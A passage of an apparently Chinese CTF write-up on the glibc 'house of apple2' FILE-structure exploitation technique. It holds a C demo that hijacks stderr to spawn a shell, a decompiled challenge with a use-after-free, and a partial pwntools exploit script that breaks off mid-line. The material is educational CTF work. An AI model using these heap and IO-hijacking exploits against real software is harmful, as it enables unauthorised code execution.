class="string">&quot;[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow&quot;</span>);</span><br><span class="line">    *(<span class="type">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)(&amp;backdoor);</span><br><span class="line"> </span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;[+] step 8: call fflush(stderr) to trigger backdoor func&quot;</span>);</span><br><span class="line">    fflush(<span class="built_in">stderr</span>);</span><br><span class="line"> </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>总结一下条件<br><code>fp-&gt;_flags</code>设置为<code>0x800</code>，如果需要getshell则设置为<code>0xfbad0802</code>或者<code>0xffff0802</code>，然后后续加上<code>;sh\x00</code>即可<br><code>fp-&gt;vtable</code>设置为<code>_IO_wstrn_jumps</code> (<code>/_IO_wmem_jumps/_IO_wstr_jumps</code>)，这里测试发现<code>_IO_wstrn_jumps - 0x20</code>可行 <br><code>fp-&gt;_wide_data-&gt;_IO_write_ptr</code> <strong>&gt;</strong> <code>fp-&gt;_wide_data-&gt;_IO_write_base</code><br><code>fp-&gt;_wide_data-&gt;_IO_read_end == fp-&gt;_wide_data-&gt;_IO_read_ptr</code> &#x3D;&#x3D; <strong>0</strong><br><code>fp-&gt;_wide_data</code>写入可控地址<br><code>fp-&gt;_wide_data-&gt;_wide_vtable-&gt;overflow</code>（位于<code>fp-&gt;_wide_data-&gt;_wide_vtable+0x68</code>）设置为后门函数<br><code>fp-&gt;_wide_data-&gt;_IO_write_base</code> &#x3D;&#x3D; <code>fp-&gt;_wide_data-&gt;_IO_buf_base</code> &#x3D;&#x3D; <strong>0</strong><br><br>效果如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">r3t2@LAPTOP-6JKPOVPE:~/CTF/pwn_demos/apple$ ./demo2</span><br><span class="line">[*] allocate two 0x200 chunks</span><br><span class="line">[*] _IO_2_1_stderr_ address: 0x702910a1b6a0</span><br><span class="line">[*] _IO_wstrn_jumps address: 0x702910a16dc0</span><br><span class="line">[+] step 1: change stderr-&gt;_flags to 0x800</span><br><span class="line">[+] step 2: change stderr-&gt;_mode to 1</span><br><span class="line">[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps - 0x20</span><br><span class="line">[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step 8: call fflush(stderr) to trigger backdoor func</span><br><span class="line">[!] Backdoor is called!</span><br></pre></td></tr></table></figure><p>然后这里我们在step2加上<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">sprintf</span>(&amp;stderr2[<span class="number">4</span>], <span class="string">&quot;%s&quot;</span>, <span class="string">&quot;;sh\x00&quot;</span>);</span><br></pre></td></tr></table></figure><p>step7改成<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">size_t</span> *)(p2 + <span class="number">0x18</span>) = (<span class="type">size_t</span>)(&amp;system);</span><br></pre></td></tr></table></figure><p>这时候gdb执行到最后发现<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; r</span><br><span class="line">Starting program: /home/r3t2/CTF/pwn_demos/apple/demo2</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[*] allocate two 0x200 chunks</span><br><span class="line">[*] _IO_2_1_stderr_ address: 0x7ffff7e1b6a0</span><br><span class="line">[*] _IO_wstrn_jumps address: 0x7ffff7e16dc0</span><br><span class="line">[+] step 1: change stderr-&gt;_flags to 0x800</span><br><span class="line">[+] step 2: change stderr-&gt;_mode to 1</span><br><span class="line">[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps - 0x20</span><br><span class="line">[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step 8: call fflush(stderr) to trigger backdoor func</span><br><span class="line">[Attaching after Thread 0x7ffff7fb1740 (LWP 25536) vfork to child process 25539]</span><br><span class="line">[New inferior 2 (process 25539)]</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[Detaching vfork parent process 25536 after child exec]</span><br><span class="line">[Inferior 1 (process 25536) detached]</span><br><span class="line">process 25539 is executing new program: /usr/bin/dash</span><br><span class="line">[Thread debugging using libthread_db enabled]</span><br><span class="line">Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.</span><br><span class="line">[Inferior 2 (process 25539) exited normally]</span><br></pre></td></tr></table></figure><p>发现这里确实启动了<code>/usr/bin/dash</code>但是直接退出了，这里怀疑是<code>system</code>的参数问题，然后意识到覆盖的<code>_wide_vtable-&gt;_overflow</code>的参数是<code>stderr</code>，我们这里仅仅在其<code>_flags</code>域（为0x800）后加上<code>;sh\x00</code>，会被<code>0x800</code>的<code>\x00</code>截断导致<code>system</code>的参数异常<br>如何解决呢？把截断想办法去掉就好了<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">*(<span class="type">size_t</span> *)stderr2 = <span class="number">0xfbad0802</span>; <span class="comment">//0xffff0802</span></span><br></pre></td></tr></table></figure><p>这样修改后执行<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">r3t2@LAPTOP-6JKPOVPE:~/CTF/pwn_demos/apple$ ./demo2</span><br><span class="line">[*] allocate two 0x200 chunks</span><br><span class="line">[*] _IO_2_1_stderr_ address: 0x73fe9f41b6a0</span><br><span class="line">[*] _IO_wstrn_jumps address: 0x73fe9f416dc0</span><br><span class="line">[+] step 1: change stderr-&gt;_flags to 0xfbad0802</span><br><span class="line">[+] step 2: change stderr-&gt;_mode to 1</span><br><span class="line">[+] step 3: change stderr-&gt;vtable to _IO_wstrn_jumps - 0x20</span><br><span class="line">[+] step 4: replace stderr-&gt;_wide_data with the allocated chunk p1</span><br><span class="line">[+] step 5: set stderr-&gt;_wide_data-&gt;_wide_vtable with the allocated chunk p2</span><br><span class="line">[+] step 6: set stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_ptr &gt;  stderr-&gt;_wide_data-&gt;_wide_vtable-&gt;_IO_write_base</span><br><span class="line">[+] step 7: put backdoor at fake _wide_vtable-&gt;_overflow</span><br><span class="line">[+] step 8: call fflush(stderr) to trigger backdoor func</span><br><span class="line">sh: 1:��: not found</span><br><span class="line">$ whoami</span><br><span class="line">r3t2</span><br><span class="line">$</span><br></pre></td></tr></table></figure><p>成功getshell<br></p><h4 id="IO-wfile-underflow-mmap"><a href="#IO-wfile-underflow-mmap" class="headerlink" title="_IO_wfile_underflow_mmap"></a>_IO_wfile_underflow_mmap</h4><p>#todo</p><h2 id="0x02-例题-LitCTF2024-heap-2-39"><a href="#0x02-例题-LitCTF2024-heap-2-39" class="headerlink" title="0x02 例题 LitCTF2024 heap-2.39"></a>0x02 例题 LitCTF2024 heap-2.39</h2><p>题目源码如下<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> __fastcall <span class="title function_">main</span><span class="params">(<span class="type">int</span> argc, <span class="type">const</span> <span class="type">char</span> **argv, <span class="type">const</span> <span class="type">char</span> **envp)</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> v4; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v5; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v5 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  init(argc, argv, envp);</span><br><span class="line">  v4 = <span class="number">0</span>;</span><br><span class="line">  <span class="keyword">while</span> ( <span class="number">1</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    menu();</span><br><span class="line">    __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v4);</span><br><span class="line">    <span class="keyword">switch</span> ( v4 )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">1</span>:</span><br><span class="line">        create();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">2</span>:</span><br><span class="line">        delete();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">3</span>:</span><br><span class="line">        show();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">4</span>:</span><br><span class="line">        edit();</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">      <span class="keyword">case</span> <span class="number">5</span>:</span><br><span class="line">        Exit();</span><br><span class="line">      <span class="keyword">default</span>:</span><br><span class="line">        <span class="built_in">puts</span>(<span class="string">&quot;error!&quot;</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>建堆函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">__int64 <span class="title function_">create</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  __int64 result; <span class="comment">// rax</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// ebx</span></span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v2; <span class="comment">// [rsp+0h] [rbp-20h] BYREF</span></span><br><span class="line">  <span class="type">int</span> v3; <span class="comment">// [rsp+4h] [rbp-1Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v4; <span class="comment">// [rsp+8h] [rbp-18h]</span></span><br><span class="line"></span><br><span class="line">  v4 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v2 = <span class="number">0</span>;</span><br><span class="line">  v3 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v2);</span><br><span class="line">  <span class="keyword">if</span> ( v2 &gt; <span class="number">0xF</span> || ptr[v2] || (<span class="built_in">printf</span>(<span class="string">&quot;size? &quot;</span>), __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v3), v3 &lt;= <span class="number">1039</span>) || v3 &gt; <span class="number">4096</span> )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;error !&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    v1 = v2;</span><br><span class="line">    ptr[v1] = <span class="built_in">malloc</span>(v3);</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[v2] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">puts</span>(<span class="string">&quot;malloc error!&quot;</span>);</span><br><span class="line">      <span class="built_in">exit</span>(<span class="number">1</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    result = (<span class="type">unsigned</span> <span class="type">int</span>)v3;</span><br><span class="line">    ptr_size[v2] = v3;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>限定了size在largebin范围。记录了size大小<br>free函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> <span class="title function_">delete</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v0; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v1; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v1 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v0 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v0);</span><br><span class="line">  <span class="keyword">if</span> ( v0 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v0] )</span><br><span class="line">    <span class="built_in">free</span>((<span class="type">void</span> *)ptr[v0]);</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>未清指针，可以uaf<br>打印函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> <span class="title function_">show</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v1] )</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">printf</span>(<span class="string">&quot;content : %s\n&quot;</span>, (<span class="type">const</span> <span class="type">char</span> *)ptr[v1]);</span><br><span class="line">  <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">  <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>直接输出，注意printf的截断<br>edit函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">ssize_t</span> <span class="title function_">edit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">unsigned</span> <span class="type">int</span> v1; <span class="comment">// [rsp+4h] [rbp-Ch] BYREF</span></span><br><span class="line">  <span class="type">unsigned</span> __int64 v2; <span class="comment">// [rsp+8h] [rbp-8h]</span></span><br><span class="line"></span><br><span class="line">  v2 = __readfsqword(<span class="number">0x28u</span>);</span><br><span class="line">  v1 = <span class="number">0</span>;</span><br><span class="line">  <span class="built_in">printf</span>(<span class="string">&quot;idx? &quot;</span>);</span><br><span class="line">  __isoc99_scanf(<span class="string">&quot;%d&quot;</span>, &amp;v1);</span><br><span class="line">  <span class="keyword">if</span> ( v1 &lt;= <span class="number">0xF</span> &amp;&amp; ptr[v1] )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;content : &quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> read(<span class="number">0</span>, (<span class="type">void</span> *)ptr[v1], (<span class="type">unsigned</span> <span class="type">int</span>)ptr_size[v1]);</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">else</span></span><br><span class="line">  &#123;</span><br><span class="line">    <span class="built_in">puts</span>(<span class="string">&quot;no such chunk!&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0LL</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>根据建堆时记录的size限制输入大小，无法溢出，但是可以利用presize的复用<br>退出函数<br></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">void</span> __noreturn <span class="title function_">Exit</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="type">int</span> i; <span class="comment">// [rsp+Ch] [rbp-4h]</span></span><br><span class="line"></span><br><span class="line">  <span class="keyword">for</span> ( i = <span class="number">0</span>; i &lt;= <span class="number">15</span>; ++i )</span><br><span class="line">  &#123;</span><br><span class="line">    <span class="keyword">if</span> ( !ptr[i] )</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="built_in">free</span>((<span class="type">void</span> *)ptr[i]);</span><br><span class="line">      ptr[i] = <span class="number">0LL</span>;</span><br><span class="line">      ptr_size[i] = <span class="number">0</span>;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="built_in">exit</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>可以主动触发exit();<br>例行公事，checksec一下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">r3t2@LAPTOP-6JKPOVPE:~/2.39$ checksec heap</span><br><span class="line">[*] &#x27;/home/r3t2/2.39/heap&#x27;</span><br><span class="line">    Arch:       amd64-64-little</span><br><span class="line">    RELRO:      Full RELRO</span><br><span class="line">    Stack:      Canary found</span><br><span class="line">    NX:         NX enabled</span><br><span class="line">    PIE:        PIE enabled</span><br><span class="line">    SHSTK:      Enabled</span><br><span class="line">    IBT:        Enabled</span><br><span class="line">    Stripped:   No</span><br></pre></td></tr></table></figure><p>此题可以申请16个chunk进行操作。限制很少，总体思路是利用unsortedbin leak泄露libc地址，heap_base也可以直接打印largebin中的chunk的<code>fd_nextsize</code>来泄露，然后largebin attack来向<code>_IO_list_all</code>写入堆地址，接着利用可控的chunk来伪造一个fake_io_file，打house of apple2。本题io链如下<br></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">_IO_OVERFLOW(fp, ch) </span><br><span class="line">  └→ __overflow → _IO_wfile_overflow  </span><br><span class="line">    └→ _IO_wdoallocbuf  </span><br><span class="line">      └→ _IO_WDOALLOCATE(fp)  </span><br><span class="line">         └→ WJUMP0(__doallocate, fp)  </span><br><span class="line">            └→ 调用 fp-&gt;_wide_data-&gt;_wide_vtable-&gt;__doallocate(fp)</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>exp<br></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.os=<span class="string">&#x27;linux&#x27;</span></span><br><span class="line">context.arch=<span class="string">&#x27;amd64&#x27;</span></span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#io=process(&#x27;./heap&#x27;)</span></span><br><span class="line">io=remote(<span class="string">&#x27;node4.anna.nssctf.cn&#x27;</span>,<span class="number">28176</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc.so.6&#x27;</span>)</span><br><span class="line">e=ELF(<span class="string">&#x27;./heap&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">creat</span>(<span class="params">idx,size</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;size? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(size))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">free</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">show</span>(<span class="params">idx</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;3&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit</span>(<span class="params">idx,content</span>):</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;&gt;&gt;&#x27;</span>)</span><br><span class="line">    io.sendline(<span class="string">b&#x27;4&#x27;</span>)</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;idx? &#x27;</span>)</span><br><span class="line">    io.sendline(<span class="built_in">str</span>(idx))</span><br><span class="line">    io.recvuntil(<span class="string">b&#x27;content : \n&#x27;</span>)</span><br><span class="line">    io.sendline(content)</span><br><span class="line"></span><br><span class="line">creat(<span class="number">0</span>,<span class="number">0x520</span>)</span><br><span class="line">creat(<span class="number">1</span>,<span class="number">0x508</span>) <span class="comment">#防止被topchunk合并,同时用于覆盖fake_io_file的_flag位</span></span><br><span class="line">creat(<span class="number">2</span>,<span class="number">0x510</span>)</span><br><span class="line">creat(<span class="number">3</span>,<span class="number">0x500</span>) <span class="comment">#防止被topchunk合并</span></span><br><span class="line"></span><br><span class="line">free(<span class="number">0</span>)</span><br><span class="line">show(<span class="number">0</span>)</span><br><span class="line">io.recvuntil(<span class="string">b&#x27;content : &#x27;</span>)</span><br><span class="line">leak_addr=u64(io.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))</span><br><span class="line">libc_base=leak_addr-<span class="number">96</span>-<span class="number">0x203ac0</span> <span class="comment">#0x203ac0是直接ida中查看对应libc文件的malloc_trim函数得到的main_arena的偏移</span></span><br><span class="line">log.success(<span class="string">&quot;libc_base--&gt;&quot;</span>+<span class="built_in">hex</span>(libc_base))</span><br><span class="line">target_addr=libc_base+libc.sym[<span class="string">&#x27;_IO_list_all&#x27;</span>]</span><br><span class="line"></span><br><span class="line">creat(<span class="number">4</span>,<span class="number">0x900</span>) <span class="comment"># chunk0进入largebin，用于泄露堆基址，并为largebin attack做准备</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,<span class="string">b&#x27;a&#x27;</span>*<span class="number">0xf</span>+<span 